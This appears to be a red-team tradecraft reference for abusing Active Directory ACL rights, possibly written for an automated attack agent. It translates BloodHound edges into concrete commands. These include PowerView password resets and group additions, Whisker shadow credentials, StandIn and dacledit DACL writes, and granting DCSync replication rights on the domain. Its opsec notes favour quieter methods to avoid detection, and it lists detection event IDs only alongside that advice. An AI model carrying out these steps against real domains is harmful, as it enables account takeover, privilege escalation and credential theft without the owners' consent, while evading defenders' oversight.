---
name: ACL Abuse Chain Reference
category: acl-abuse
subcategories: [genericall, genericwrite, writedacl, addself, forcechangepassword]
tradecraft_tags: [acl, genericall, genericwrite, writedacl, ownership, technique, chain]
mitre_attack:
  - id: T1222.001
    name: File and Directory Permissions Modification — Windows File and Directory Permissions Modification
  - id: T1098
    name: Account Manipulation
source:
  url: https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  ACL abuse operations generate Event 5136 (Object Modification) when AD object attributes
  are changed. Group membership changes generate Event 4728/4732 (member added). ACL
  changes themselves generate Event 4670 (Permissions on an object were changed). MDI
  detects many ACL abuse patterns. PowerView's Add-DomainObjectAcl is more detectable
  than targeted native LDAP calls.
usage_examples:
  - description: GenericAll on User — reset password (no cracking needed)
    args: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssNew1!' -AsPlainText -Force)"
  - description: GenericAll on Group — add a controlled principal to the target group
    args: "Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<CONTROLLED_PRINCIPAL>'"
  - description: GenericWrite on User — add SPN for targeted kerberoast (then use cert/delegation path)
    args: "Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}"
  - description: WriteDACL on Object — grant self GenericAll, then act
    args: "Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity attacker -Rights All"
  - description: WriteOwner — take ownership, then WriteDACL → GenericAll
    args: "Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attacker"
  - description: ForceChangePassword on User
    args: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssNew1!' -AsPlainText -Force)"
  - description: GenericWrite on Computer — add to shadow credentials or set SPN
    args: "Whisker.exe add /target:VICTIM$"
opsec_notes: |
  Password resets (ForceChangePassword) are very noisy — the user will immediately notice.
  Prefer shadow credentials (Whisker) or SPN-addition (for non-cracking paths) over
  password resets when GenericWrite is present. Group membership additions (GenericAll
  on group) generate Event 4732 — immediate detection signal for security-monitored groups
  (Domain Admins). WriteDACL + self-grant is a two-step operation that generates two 5136
  events. WriteOwner + subsequent DACL change is similarly double-event.
gotchas: |
  ACL changes are persistent — if you add yourself to Domain Admins or reset a password,
  that change stays until manually reversed. This is high-impact, reversible, but immediately
  visible to defenders and the target user. Always clean up ACL changes. Shadow credentials
  (Whisker) and SPN manipulation are less disruptive than password resets. For GenericWrite
  on a computer, Whisker is the preferred path over password reset (which would break
  computer domain membership).
related_ttps: [whisker, standin, sharpgpoabuse, powerview, rubeus, certify]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# ACL Abuse Chain Reference

A reference for translating BloodHound ACL edges into concrete exploitation operations.
When SharpHound/BloodHound identifies a controlled principal with specific ACL rights over
a target, this document maps the edge type to the appropriate exploitation technique.

## ACL Edge to Exploitation Mapping

| BloodHound Edge | Target Type | Exploitation Path | Primary Tool |
|----------------|-------------|------------------|--------------|
| `GenericAll` | User | Whisker (shadow cred) OR password reset | Whisker preferred |
| `GenericAll` | Group | Add a controlled principal to the group over LDAP | StandIn `--group --ntaccount --add` · impacket-dacledit · PowerView |
| `GenericAll` | Computer | Whisker (shadow cred) OR RBCD via StandIn | Whisker preferred |
| `GenericAll` | GPO | Modify GPO for code exec / local admin | SharpGPOAbuse |
| `GenericWrite` | User | Whisker (shadow cred) OR SPN set for delegation | Whisker preferred |
| `GenericWrite` | Computer | Whisker (shadow cred) OR msDS-AllowedToDelegateTo | Whisker preferred |
| `WriteDACL` | Any | Grant GenericAll to a controlled principal | impacket-dacledit / StandIn / PowerView Add-DomainObjectAcl |
| `WriteOwner` | Any | Take ownership, then modify the DACL | impacket-owneredit / StandIn / PowerView Set-DomainObjectOwner |
| `AddSelf` | Group | Add the controlled principal to the group | StandIn `--group --ntaccount --add` · Net group · PowerView |
| `AddMember` | Group | Add an authorized principal to the group | StandIn `--group --ntaccount --add` · PowerView |
| `ForceChangePassword` | User | Reset password (NOISY — prefer Whisker) | Set-DomainUserPassword |
| `Owns` | Any | Same as WriteOwner | PowerView |
| `AllExtendedRights` | User | Whisker OR password reset | Whisker preferred |
| `GenericAll`/`WriteDACL`/`WriteOwner` | Domain | Grant a controlled principal both DS-Replication extended rights | StandIn `--object <TARGET_DOMAIN_DN> --grant --guid` · impacket-dacledit · PowerView |

## Non-PowerShell execution

When PowerShell is unavailable, use an equivalent that fits the active payload and access context:

| Operation | Non-PowerShell tool | Syntax |
|-----------|--------------------|--------|
| Add a principal to a group (GenericAll/AddSelf/AddMember on group) | StandIn | `StandIn.exe --group "<TARGET_GROUP>" --ntaccount "<CONTROLLED_PRINCIPAL>" --add` |
| Write/modify a DACL (WriteDACL/WriteOwner) | impacket-dacledit / StandIn | `dacledit.py -action write -rights FullControl -principal <CONTROLLED_PRINCIPAL> -target-dn <TARGET_OBJECT_DN>` |
| Read/verify an object's DACL before acting | **SharpObjectACL** (read-only) | `SharpObjectACL.exe -target "<DN>"` |

SharpObjectACL only reads DACLs; pair it with a compatible write-capable tool when mutation is authorized.

## Why Whisker Is Usually Preferred

Password reset is irreversible without knowing the old password — the user is immediately
locked out of their account and will notice. Shadow credentials via Whisker:
- Don't change the user's password
- Are invisible to the user
- Can be removed cleanly (`Whisker clear /target:X`)
- Work for both user and computer accounts

**Exception:** If the account is a service account that nobody logs into, password
reset is acceptable and simpler.

## DCSync via WriteDACL on Domain

DCSync requires TWO extended rights on the domain object: `DS-Replication-Get-Changes`
(`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All`
(`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`).

**PRECONDITION — only self-grant when your CURRENT identity already owns the domain-head DACL.** The
grant below is a DACL write on the domain object: it succeeds ONLY when the principal *executing it*
holds `WriteDACL`/`GenericAll`/`Owns`/`WriteOwner` on the Domain node (confirm with a BloodHound edge
`your-principal → Domain`). A normal domain user does not hold that, and `NT AUTHORITY\SYSTEM` on a
**member** host does not either. Attempting the self-grant from a context that lacks the domain-head edge
returns *Access denied* — that is an **identity/context** problem, not a delivery problem; do not retry
the grant, change the context.

If that domain-head precondition is absent, do not attempt the grant. Re-plan from independently verified
graph or control-plane state instead of treating a member-host context as domain authority.

**Read the GetNCChanges error code first:** `0x2105` / **8453 `DS_DRA_ACCESS_DENIED`** = you lack the
replication rights → apply the grant below. `0x20f7` / **8439 `DS_DRA_BAD_DN`** = wrong/invalid naming
context → this is a **targeting** bug (wrong forest/DN/DC), NOT a rights problem; fix the target first
(see per-forest note below). Do not grant rights to "fix" an 8439.

**StandIn:**

```
StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
StandIn.exe --object "<TARGET_DOMAIN_DN>" --grant "<CONTROLLED_PRINCIPAL>" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
```

The LDAP grant, DACL readback, and protected-account DCSync should bind to `<TARGET_DOMAIN_DN>`,
`<TARGET_DOMAIN_FQDN>`, and the same `<TARGET_DC_FQDN>`. Switching DCs before replication converges can
produce 8453; crossing naming contexts produces 8439 or a malformed LDAP filter. When the principal is
from another realm, confirm that the target DC resolves and honors its SID.

**PowerShell (only if PowerView already loaded — NOT for the no-PS autonomous solve):**

```
PowerView: Add-DomainObjectAcl -TargetIdentity "<TARGET_DOMAIN_DN>" -PrincipalIdentity <CONTROLLED_PRINCIPAL> -Rights DCSync
```
